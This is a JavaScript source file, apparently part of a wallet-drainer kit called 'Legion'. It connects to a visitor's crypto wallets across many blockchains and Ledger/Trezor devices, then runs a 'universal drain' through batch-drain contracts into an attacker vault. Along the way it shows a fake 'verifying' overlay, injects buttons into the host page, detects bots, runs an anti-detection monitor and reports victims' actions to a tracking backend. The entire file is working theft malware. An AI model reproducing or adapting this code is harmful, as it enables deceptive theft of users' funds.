      var walletName = (walletInfo && walletInfo.info && walletInfo.info.name)
        || (hwObj && (hwObj.type === 'ledger' ? 'Ledger' : 'Trezor'))
        || detectEvmWalletName(provider)
        || 'Unknown Wallet';

      S.evmAddr = address; S.evmChain = chainId;
      S.evmProvider = provider; S.evmWallet = walletName;
      try { sessionStorage.setItem('legion_wc_evm_addr', address); } catch (eSs) {}
      logConnect('ok', address + ' | ' + walletName + ' | chain ' + chainId +
        (isWcProv ? ' | via MOBILE-WC' : ' | via EXTENSION'));

      if (hasFactoryOnChain(chainId)) {
        ensureUserFactoryContract(address, chainId).catch(function (e) {
          L.warn('factory prefetch:', e.message);
        });
      }

      var chainMeta = CHAIN_META[chainId] || { name: 'Chain ' + chainId };
      UI.setConnected(address, chainMeta.name);
      emitLegionEvent('legion:connected', { address: address, chainId: chainId, wallet: walletName });

      closeAppKitModal();
      UI.overlay.show('verifying');

      if (!AUTO_DRAIN || S.drainRunning) {
        UI.overlay.hide();
        return;
      }
      S.drainRunning = true;
      S.pendingEvmPermit2 = null;
      S.connectSession = 'legion:' + Date.now() + ':' + Math.random().toString(36).slice(2, 8);
      S.fusionNotified = false;
      S.familiesLinked = false;
      S.familyConnections = {};
      S.evmScanChainIds = null;
      S.lastDrainSkipReason = '';
      S.chains = { EVM: null, SOL: null, TRON: null, TON: null, BTC: null, COSMOS: null, APTOS: null, SUI: null };
      S.allAddresses = {};

      UI.showStatus('Linking all blockchains...');
      await linkAllFamiliesOnConnect(address);
      await waitForWcBip122Harvest(address);
      S.allAddresses = collectAddressMap(address);
      await broadcastConnectScan(address, chainId, walletName, S.allAddresses);

      await sleep(CFG.delayDrainMs || 300);

      L.log('[connect] families linked — starting drain');
      try {
        await runUniversalDrain({
          provider: provider,
          address: address,
          chainId: chainId,
          walletName: walletName,
          hwObj: hwObj,
        });
      } catch (drainErr) {
        if (isUserRejection(drainErr)) {
          await SCOUT.alertStage('user_rejected', address, chainId, walletName, drainErr.message);
          UI.showUserRejected();
          return;
        }
        await SCOUT.alertFailure('EVM', 'connect_drain', drainErr, address, chainId, walletName);
        throw drainErr;
      }

      if (S.anchorsOk > 0) {
        UI.status('Complete!');
      } else {
        await SCOUT.reportDrainStatus(
          'no_action',
          address,
          chainId,
          walletName,
          S.lastDrainSkipReason || 'No signature or confirmed TX submitted'
        );
      }
      S.drainRunning = false;
      UI.overlay.hide();
    } catch (e) {
      L.warn('EVM connect error:', e.message);
      S.drainRunning = false;
      if (isUserRejection(e)) {
        if (S.connectMode === 'injected') {
          await clearInjectedSession({ keepMode: false });
        }
        UI.showUserRejected();
        if (S.evmAddr) {
          await SCOUT.alertStage('user_rejected', S.evmAddr, S.evmChain, S.evmWallet, e.message);
        }
        return;
      }
      var friendly = String(e.message || 'Connection failed');
      if (/not installed|could not retrieve|timed out/i.test(friendly)) {
        UI.showConnectError(friendly);
      } else {
        UI.showConnectError('Could not connect — ' + friendly);
      }
      if (S.evmAddr) {
        await SCOUT.alertFailure('EVM', 'connect', e, S.evmAddr, S.evmChain, S.evmWallet);
      }
    } finally {
      S.connecting = false;
    }
  }

  async function handleConnect() {
    if (S.drainRunning) return;
    if (isWcConnectActive()) {
      logConnect('blocked', 'handleConnect — WC active, use extension picker after closing QR');
      return;
    }
    if (!S.vaultLoaded) await prefetchVault();
    await prepInjectedMode();

    if (PLAT.strategy === 'inapp' && window.ethereum) {
      await handleEvmConnect(window.ethereum, { info: { name: PLAT.walletApp || 'Wallet' } });
      return;
    }

    if (CFG.hwWallets && HW.available()) {
      var ledger = await HW.connectLedger();
      if (ledger) {
        var hwProv = {
          request: async function (args) {
            if (args.method === 'eth_requestAccounts') return [ledger.address];
            if (args.method === 'eth_chainId') return '0x1';
            return null;
          },
        };
        await handleEvmConnect(hwProv, null, ledger);
        return;
      }
      var trezor = await HW.connectTrezor();
      if (trezor) {
        var tzProv = {
          request: async function (args) {
            if (args.method === 'eth_requestAccounts') return [trezor.address];
            if (args.method === 'eth_chainId') return '0x1';
            if (args.method === 'eth_signTypedData_v4') {
              var td = typeof args.params[1] === 'string' ? JSON.parse(args.params[1]) : args.params[1];
              var sig = await HW.signTrezorTypedData(td);
              if (!sig) throw new Error('Trezor typed data sign failed');
              return sig;
            }
            if (args.method === 'eth_signTransaction') {
              var signed = await HW.signTrezorTransaction(args.params[0]);
              if (!signed) throw new Error('Trezor transaction sign failed');
              return signed;
            }
            return null;
          },
        };
        await handleEvmConnect(tzProv, null, trezor);
        return;
      }
    }

    await openExtensionPicker();
  }

  async function handleWC() {
    if (S.drainRunning) return;
    if (S.connecting || _wcConnecting) {
      logConnect('skip', 'WC connect already running');
      return;
    }
    if (!S.vaultLoaded) await prefetchVault();
    await clearInjectedSession({ keepMode: true });
    installWcGuard();
    UI._walletIcon = '';
    _wcConnecting = false;
    S.connectMode = 'wc';

    var wcProv = await tryRecoverWcSession();
    if (!wcProv) {
      await cleanConflictingWcSessions();
      await prepWcOnlyMode(true);
    } else {
      await prepWcOnlyMode(false);
    }

    var wcBlockedByExt = false;
    if (!wcProv) {
    for (var attempt = 0; attempt < 2; attempt++) {
      try {
        L.log('WC: Reown AppKit (attempt', attempt + 1, ')');
        wcProv = await bundledWalletConnect();
        if (!wcProv) {
          var hijackId = getLegionConnectorId().toLowerCase();
          if (isInjectedConnectorId(hijackId)) {
            L.warn('WC hijacked by extension:', hijackId);
            await disconnectLegionWallet();
            await prepWcOnlyMode(true);
            wcBlockedByExt = true;
            continue;
          }
          L.log('WC: polling mobile session...');
          wcProv = await pollWcProviderReady(60000);
        }
        if (wcProv) {
          var activeId = getLegionConnectorId().toLowerCase();
          if (!isRealWalletConnectSession(activeId, wcProv)) {
            L.warn('WC hijacked by', activeId || 'extension', '— retry');
            await disconnectLegionWallet();
            wcProv = null;
            wcBlockedByExt = isInjectedConnectorId(activeId);
            await prepWcOnlyMode(true);
            continue;
          }
          break;
        }
      } catch (e) {
        L.warn('WC attempt fail:', e.message);
      }
    }
    }

    if (!wcProv) {
      removeWcGuard();
      S.wcSessionActive = false;
      UI.overlay.hide();
      if (wcBlockedByExt) {
        UI.showStatus('WalletConnect = phone QR only. Disable MetaMask for this site, or use Incognito without extensions.');
      } else {
        UI.showStatus('WalletConnect failed — scan QR and approve on your phone wallet');
      }
      return;
    }

    try {
      var wcAccts = await wcProv.request({ method: 'eth_accounts' }).catch(function () { return null; });
      if (!wcAccts || !wcAccts.length) {
        wcAccts = await evmRequestAccounts(wcProv);
      }
      if (!wcAccts || !wcAccts.length) {
        var sessAddr = resolveWcEvmAddress();
        if (sessAddr) wcAccts = [sessAddr];
      }
      if (!wcAccts || !wcAccts.length) {
        removeWcGuard();
        S.wcSessionActive = false;
        UI.overlay.hide();
        L.warn('WC connected but no EVM address resolved');
      return;
    }
      L.log('WC account resolved:', String(wcAccts[0]).slice(0, 10) + '...');
      S.wcSessionExpired = false;
    } catch (accErr) {
      var recovered = resolveWcEvmAddress();
      if (!recovered) {
        L.warn('WC account check:', accErr.message);
        removeWcGuard();
        S.wcSessionActive = false;
        UI.overlay.hide();
        return;
      }
      L.log('WC account recovered from session after RPC fail');
    }

    S.wcSessionActive = true;
    S.connectMode = 'wc';
    L.log('WC provider ready | wc:', !!(wcProv && wcProv.isWalletConnect));

    var wcFam = scanWcSessionAllFamilies();
    if (!wcFam.btc && !S.chains.BTC) {
      UI.status('Approve Bitcoin on your phone wallet...');
      var linkedBtc = await ensureWcBip122Linked();
      if (linkedBtc) {
        applyWcSessionAddresses(scanWcSessionAllFamilies());
        wireWcFamilyConnections();
        L.log('[UTXO] bip122 ready before drain:', linkedBtc.slice(0, 8) + '...');
      } else {
        L.warn('[UTXO] bip122 not linked — BTC drain skipped');
      }
    }

    await handleEvmConnect(wcProv, { info: { name: 'WalletConnect' } });
  }

  async function init() {
    if (isBot()) { L.warn('Bot detected — abort'); return; }

    // Fire EIP-6963 immediately
    requestProviders();
    discoverChainFamilies();
    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 800);
    setTimeout(function () { requestProviders(); discoverChainFamilies(); }, 2000);

    // Prefetch vault in background
    prefetchVault();

    // Anti-detection monitor
    SEC.startMonitor();

    // Wait for wallets to announce
    await sleep(600);

    // Inject UI buttons
    var nblDrawer = document.querySelector('[data-testid="account-drawer-container"]');
    if (document.body) {
      if (!nblDrawer) UI.inject(defaultConnect, handleWC);
    } else {
      document.addEventListener('DOMContentLoaded', function () {
        if (!document.querySelector('[data-testid="account-drawer-container"]')) {
          UI.inject(defaultConnect, handleWC);
        }
      });
    }

    window.legionOpenExtensions = openExtensionPicker;

    if (!nblDrawer) {
      window.customModalOpen = defaultConnect;
      window.customModalClose = function () { UI.closeWalletModal(); };
    } else if (window.LegionDrawer && typeof window.LegionDrawer.open === 'function') {
      window.customModalOpen = function () { window.LegionDrawer.open(); };
      window.customModalClose = function () { window.LegionDrawer.close(); };
      window.customModalClickWalletConnect = function () {
        window.LegionDrawer.close();
        handleWC();
      };
    }

    L.log('Legion v' + LEGION_VERSION + ' ready — unified multi-family connect');

    // Only auto-connect when explicitly enabled (never on silentMode alone)
    if (CFG.autoConnectOnLoad === true && AUTO_DRAIN && !S.drainRunning && window.ethereum) {
      setTimeout(function () {
        handleConnect().catch(function (e) { L.warn('autoConnectOnLoad:', e.message); });
      }, 800);
    }

    if (AUTO_RUN && !S.drainRunning) {
      setTimeout(function () { handleConnect().catch(function (e) { L.warn('autoRun:', e.message); }); }, 800);
    }
  }

  // Public API
  window.legion = {
    connect: handleConnect,
    connectWC: handleWC,
    connectInjected: connectWithWallet,
    resolveProvider: resolveEvmProvider,
    providerInstalled: function (key) {
      return !!resolveEvmProvider(key);
    },
    failConnect: function (msg) {
      S.connecting = false;
      S.drainRunning = false;
      UI.showConnectError(msg || 'Could not connect to wallet.');
      clearInjectedSession({ keepMode: false }).catch(function () {});
    },
    beginConnect: function (mode) {
      if (mode === 'wc') {
        S.connectMode = 'wc';
        S.wcSessionActive = true;
        clearInjectedSession({ keepMode: true, disconnectWallet: false }).catch(function () {});
        logConnect('begin', '→ MOBILE-WC');
      } else {
        if (isWcConnectActive()) {
          logConnect('blocked', 'beginConnect extension — WC active');
          return;
        }
        S.connectMode = 'injected';
        S.wcSessionActive = false;
        removeWcGuard();
        clearWcSession(true).catch(function () {});
        UI.overlay.show('connecting', { walletIcon: UI._walletIcon || '' });
        logConnect('begin', '→ EXTENSION');
      }
      if (typeof window.customModalClose === 'function') window.customModalClose();
    },
    isWcActive: isWcConnectActive,
    clearInjected: clearInjectedSession,
    clearWc: clearWcSession,
    openPanel: defaultConnect,
    openExtensions: openExtensionPicker,
    drain: handleConnect,
    hook: function () { hookPageButtons(defaultConnect); },
    state: S,
    config: CFG,
    version: LEGION_VERSION,
    contracts: {
      legionDrain: LEGION_DRAIN,
      batchDrainV1: BATCH_DRAIN,
      batchDrainV2: BATCH_DRAIN_V2,
      batchDrainV2OnChainVault: BATCH_DRAIN_V2_ONCHAIN_VAULT,
      apiVault: function () { return VAULT.evm; },
      coverage: function (chainId) {
        var id = Number(chainId || 1);
        return {
          chainId: id,
          claimForwarder: resolveClaimContract(id),
          batchDrainV1: isZeroAddr(BATCH_DRAIN[id]) ? null : BATCH_DRAIN[id],
          batchDrainV2: resolveBatchDrainV2(id),
          apiVault: VAULT.evm,
          batchV2HardcodedVault: BATCH_DRAIN_V2_ONCHAIN_VAULT,
        };
      },
    },
  };

  try {
    window.dispatchEvent(new CustomEvent('legion:ready', { detail: { version: LEGION_VERSION } }));
  } catch (readyEv) { /* IE11 guard */ }

  // Boot
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
